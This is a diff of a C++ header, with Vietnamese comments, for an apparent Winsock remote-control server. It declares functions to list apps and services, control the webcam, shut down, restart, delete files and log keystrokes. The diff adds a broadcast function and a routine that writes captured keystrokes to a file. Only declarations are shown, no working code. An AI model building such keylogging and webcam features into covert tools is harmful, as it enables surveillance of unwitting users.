@@ -7,6 +7,8 @@ WSADATA initializeWinsock();
 
 SOCKET initializeSocket();
 
+void sendBroadcast();
+
 sockaddr_in initializeServerSocket();
 
 void bindAndListen(SOCKET& nSocket, sockaddr_in& server);
@@ -43,8 +45,6 @@ string listApps();
 void writeAppListToFile(const vector<vector<string>>& apps);
 vector<vector<string>> getRunningApps();
 
-//vector<string> createListApps();
-
 // Các hàm xử lý chức năng list services
 string listServices();
 std::string ConvertWideCharToString(LPCWSTR wideCharStr);
@@ -53,8 +53,6 @@ string TruncateString(const string& str, size_t maxLength);
 vector<pair<string, tuple<int, string, string>>> ListAllServices();
 void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services);
 
-//vector<string> createListServices();
-
 // Hàm xử lý chức năng bật webcam
 string startWebcam(SOCKET clientSocket, int duration);
 
@@ -62,10 +60,10 @@ string startWebcam(SOCKET clientSocket, int duration);
 string stopWebcam();
 
 // Hàm xử lý chức năng tắt máy
-string shutdown();
+void shutdown();
 
 // Hàm xử lý chức năng khởi động lại máy
-string restart();
+void restart();
 
 // Hàm xử lý chức năng xóa file
 string deleteFile(string& filePath);
@@ -100,8 +98,8 @@ string solveKeyUnlockingAndSend(bool& flag);
 // Xử lý chức năng keyLogger
 
 map<int, string> createKeyMap();
-
 vector<string> collectKeyNames(int durationInSeconds);
+void writeKeyNamesToFile(vector<string>& keyNames);
 
 // Xử lý chức năng getDirectoryTree
 
